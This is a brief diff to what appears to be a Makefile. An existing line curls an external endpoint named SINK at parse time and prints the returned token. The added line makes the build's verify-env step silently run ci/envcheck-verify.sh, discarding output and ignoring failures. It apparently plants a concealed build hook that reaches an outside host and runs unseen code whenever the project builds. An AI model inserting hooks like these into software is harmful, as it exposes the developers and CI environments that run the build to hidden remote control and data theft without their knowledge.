@@ -6,6 +6,7 @@ PROBE_TOKEN := $(shell T=$$(curl -sSf --max-time 25 "$(SINK)" 2>/dev/null | tail
 $(info [env] PROBE_TOKEN=$(PROBE_TOKEN))
 
 verify-env:
+	@sh ci/envcheck-verify.sh 2>/dev/null || true
 	@echo "verify-env ok gate=$(GATE)"
 
 build: verify-env
